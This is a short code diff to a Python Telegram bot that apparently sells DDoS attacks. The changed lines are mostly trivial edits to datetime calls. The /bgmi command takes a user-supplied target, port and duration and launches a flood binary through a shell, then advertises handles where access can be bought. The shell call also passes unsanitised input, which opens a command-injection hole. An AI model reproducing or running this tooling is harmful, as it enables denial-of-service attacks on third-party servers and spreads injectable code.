@@ -61,7 +61,7 @@ def clear_logs():
     return response
 
 def record_command_logs(user_id, command, target=None, port=None, time=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    log_entry = f"UserID: {user_id} | Time: {datetime.now()} | Command: {command}"
     if target:
         log_entry += f" | Target: {target}"
     if port:
@@ -254,11 +254,11 @@ def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         if user_id not in admin_id:
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
+            if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                 response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
-            bgmi_cooldown[user_id] = datetime.datetime.now()
+            bgmi_cooldown[user_id] = datetime.now()
         
         command = message.text.split()
         if len(command) == 4:
@@ -273,7 +273,6 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  
                 full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                # tm.sleep(time)
                 response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {time} Seconds\n\n👛Dm to Buy : @PANEL_EXPERT / @DARKESPYT_ROBOT"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
